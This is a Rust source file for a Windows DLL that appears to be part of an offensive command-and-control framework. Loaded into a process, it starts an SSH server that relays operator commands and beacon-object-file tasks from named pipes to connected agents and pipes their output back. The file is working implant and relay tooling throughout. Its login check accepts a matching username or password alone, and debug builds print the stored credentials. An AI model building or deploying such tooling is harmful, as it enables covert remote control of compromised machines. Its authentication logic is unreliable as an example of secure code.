#![no_main]
#![allow(dead_code)]
#![feature(stmt_expr_attributes)]

use std::collections::HashMap;
use std::os::raw::c_void;
use std::ptr::null_mut;
use windows_sys::Win32::Foundation::{BOOL, CloseHandle, HANDLE};

use debug_print::{debug_eprintln, debug_println};
use rand_core::OsRng;
use russh::server::{Msg, Server as _, Session};
use russh::*;
use scepter_common::pipe::{initialize_input_pipe, initialize_output_pipe, write_output};
pub use scepter_common::*;
use std::sync::Arc;
use std::thread;
use tokio::runtime::Runtime;
use tokio::sync::Mutex;
use windows_sys::Win32::System::Threading::{CreateThread, INFINITE, WaitForSingleObject, TerminateThread, GetCurrentThread};

static mut G_H_INPUT_PIPE: HANDLE = 0 as HANDLE;
static mut G_H_OUTPUT_PIPE: HANDLE = 0 as HANDLE;

#[unsafe(no_mangle)]
#[tokio::main(flavor = "current_thread")]
pub async fn dll_main() {
    debug_println!("Initialized handles");
    debug_println!("Starting server");

    let config = russh::server::Config {
        inactivity_timeout: Some(std::time::Duration::from_secs(3600)),
        auth_rejection_time: std::time::Duration::from_secs(10),
        auth_rejection_time_initial: Some(std::time::Duration::from_secs(0)),
        keys: vec![
            // TODO can probably make this a verifiable component so agent only talks to intended ssh server
            russh::keys::PrivateKey::random(&mut OsRng, russh::keys::Algorithm::Ed25519).unwrap(),
        ],
        preferred: Preferred {
            ..Preferred::default()
        },
        ..Default::default()
    };
    let config = Arc::new(config);
    let sh = Server {
        clients: Arc::new(Mutex::new(HashMap::new())),
        id: 0,
    };

    let interface_ip = String::from_utf8_lossy(SSH_INTERFACE_IPV4_ADDRESS)
        .to_string()
        .trim_matches(char::from(0))
        .to_string();
    // Clone sh if needed (if it's a type that implements Clone)
    let mut sh_clone = sh.clone();

    debug_println!("Starting command loop");

    // Create a new thread with its own tokio runtime
    thread::spawn(move || {
        debug_println!("Initializing handles");

        // Initialize output pipe
        unsafe {
            G_H_INPUT_PIPE = initialize_input_pipe().unwrap_or_else(|| {
                debug_eprintln!("Failed to initialize input pipe.");
                TerminateThread(GetCurrentThread(), 1);
                0 as HANDLE // Rust silliness
            });
        }

        // Initialize output pipe
        unsafe {
            G_H_OUTPUT_PIPE = initialize_output_pipe().unwrap_or_else(|| {
                debug_eprintln!("Failed to initialize input pipe.");
                TerminateThread(GetCurrentThread(), 1);
                0 as HANDLE // Rust silliness
            });
        }

        // Create a new tokio runtime for this thread
        let rt = Runtime::new().unwrap();

        // Clone the object if needed
        let mut sh_clone = sh.clone();

        // Execute the async function on this thread's runtime
        rt.block_on(async {
            sh_clone.command_loop().await;
        });
    });

    let interface_port = str::from_utf8(SSH_PORT)
        .unwrap()
        .trim_matches(char::from(0))
        .parse::<u16>()
        .unwrap();
    debug_println!("Starting server on {}:{}", interface_ip, interface_port);
    sh_clone
        .run_on_address(config, (interface_ip, interface_port))
        .await
        .unwrap();

    debug_println!("Exiting server")
}

#[derive(Clone)]
struct Server {
    clients: Arc<Mutex<HashMap<usize, (ChannelId, russh::server::Handle)>>>,
    id: usize,
}

impl Server {
    pub async fn post(&mut self, data: CryptoVec) {
        let mut clients = self.clients.lock().await;
        debug_println!("Broadcasting to {} clients", clients.len());
        for (id, (channel, s)) in clients.iter_mut() {
            debug_println!("Sending to client {}", id);
            let _ = match s.data(*channel, data.clone()).await {
                Ok(_) => {
                    debug_println!("Successfully sent to client {}", id);
                    id
                }
                Err(e) => {
                    debug_eprintln!("Failed to send to client {}: {:?}", id, e);
                    id
                }
            };
        }
    }

    #[cfg(not(debug_assertions))]
    /// Reads from input pipe and sends that shit to the agent
    pub async fn command_loop(&mut self) {
        loop {
            let input = match unsafe { pipe::read_input(G_H_INPUT_PIPE) } {
                None => continue,
                Some(s) => s,
            };
            let input = input.trim_matches(char::from(0));
            if input.eq("exit") {
                std::process::exit(0);
            }
            if input.starts_with("cmd:") || input.starts_with("bof:") {
                debug_println!("Sending command to agent: {}", input);
                self.post(CryptoVec::from(input)).await;
            }
        }
    }

    #[cfg(debug_assertions)]
    /// Lets you run commands to validate execution from agent
    pub async fn command_loop(&mut self) {
        loop {
            let mut input = String::new();

            match std::io::stdin().read_line(&mut input) {
                Ok(_) => debug_println!("You typed: {}", input.trim()),
                Err(err) => debug_eprintln!("Error reading line: {}", err),
            }
            let input = input.trim_matches(char::from(0));
            if input.eq("exit") {
                std::process::exit(0);
            }
            if input.starts_with("cmd:") || input.starts_with("bof:") {
                self.post(CryptoVec::from(input)).await;
            }
        }
    }
}

impl server::Server for Server {
    type Handler = Self;
    fn new_client(&mut self, addr: Option<std::net::SocketAddr>) -> Self {
        let id = self.id;
        self.id += 1; // Increment ID for next client

        let mut s = self.clone();
        s.id = id; // Set this handler's ID
        debug_println!("New client connection with ID: {}", id);
        unsafe {
            if G_H_OUTPUT_PIPE != 0 as HANDLE && addr.is_some() {
                let ip = addr.unwrap().ip().to_string();
                let port = addr.unwrap().port();
                write_output(
                    G_H_OUTPUT_PIPE,
                    &format!("Connection established {}:{}.\r\n", ip, port),
                );
            }
        }
        s
    }
    fn handle_session_error(&mut self, _error: <Self::Handler as russh::server::Handler>::Error) {
        debug_eprintln!("Session error: {:#?}", _error);
    }
}

impl server::Handler for Server {
    type Error = russh::Error;

    async fn auth_password(&mut self, user: &str, pass: &str) -> Result<server::Auth, Self::Error> {
        // Believe it or not, this is military-grade security
        let username = String::from_utf8_lossy(&*USERNAME)
            .to_string()
            .trim_matches(char::from(0))
            .to_string();

        let password = String::from_utf8_lossy(&*PASSWORD)
            .to_string()
            .trim_matches(char::from(0))
            .to_string();

        let input_username = String::from_utf8_lossy(user.as_bytes())
            .to_string()
            .trim_matches(char::from(0))
            .to_string();

        let input_password = String::from_utf8_lossy(pass.as_bytes())
            .to_string()
            .trim_matches(char::from(0))
            .to_string();
        debug_println!("Authenticating {}:{}", input_username, input_password);
        debug_println!("Expected {}:{}", username, password);
        if input_username.eq(&username) || input_password.eq(&password) {
            return Ok(server::Auth::Accept);
        }

        Err(russh::Error::NotAuthenticated)
    }

    async fn channel_open_session(
        &mut self,
        channel: Channel<Msg>,
        session: &mut Session,
    ) -> Result<bool, Self::Error> {
        debug_println!(
            "Client {} opened a session channel with ID: {}",
            self.id,
            channel.id()
        );

        // Store client in the HashMap
        let mut clients = self.clients.lock().await;
        clients.insert(self.id, (channel.id(), session.handle()));

        debug_println!("Client registered. Total clients: {}", clients.len());
        for (id, _) in clients.iter() {
            debug_println!("  Client ID: {}", id);
        }

        // Send initial welcome message
        let welcome = CryptoVec::from("Connection established. Waiting for shell request.\r\n");
        session.data(channel.id(), welcome)?;

        Ok(true)
    }

    async fn data(
        &mut self,
        _channel: ChannelId,
        data: &[u8],
        _session: &mut Session,
    ) -> Result<(), Self::Error> {
        // Sending Ctrl+C ends the session and disconnects the client
        if data == [3] {
            return Err(russh::Error::Disconnect);
        }

        let output_data = String::from_utf8_lossy(data);

        debug_println!("Got data: {}", output_data);
        unsafe {
            pipe::write_output(G_H_OUTPUT_PIPE, output_data.as_ref());
        };
        Ok(())
    }
}

impl Drop for Server {
    fn drop(&mut self) {
        let id = self.id;

        unsafe {
            if G_H_OUTPUT_PIPE != 0 as HANDLE {
                CloseHandle(G_H_OUTPUT_PIPE);
            }
            if G_H_INPUT_PIPE != 0 as HANDLE {
                CloseHandle(G_H_INPUT_PIPE);
            }
        }

        let clients = self.clients.clone();
        tokio::spawn(async move {
            let mut clients = clients.lock().await;
            clients.remove(&id);
        });
    }
}

unsafe extern "system" fn dll_main_caller(_param: *mut c_void) -> u32 {
    dll_main();
    0
}
#[unsafe(no_mangle)]
pub unsafe extern "system" fn dll_start() {
    // Create a new thread with its own tokio runtime
    unsafe {
        let h_thread = CreateThread(
            null_mut(),
            0,
            Some(dll_main_caller),
            null_mut(),
            0,
            null_mut(),
        );
        WaitForSingleObject(h_thread, INFINITE);
    }
}

#[unsafe(no_mangle)]
#[allow(named_asm_labels)]
#[allow(non_snake_case, unused_variables, unreachable_patterns)]
pub unsafe extern "system" fn DllMain(
    dll_module: HANDLE,
    call_reason: u32,
    reserved: *mut c_void,
) -> BOOL {
    match call_reason {
        DLL_PROCESS_ATTACH => {
            // Initialize resources, etc.
            unsafe { dll_start() };
        }
        DLL_THREAD_ATTACH => {
            // Code to run when a new thread is created in the process
        }
        DLL_THREAD_DETACH => {
            // Code to run when a thread exits cleanly
        }
        DLL_PROCESS_DETACH => {
            // Code to run when the DLL is unloaded from the process
            // Clean up resources, etc.
        }
        _ => {}
    }
    return 1;
}
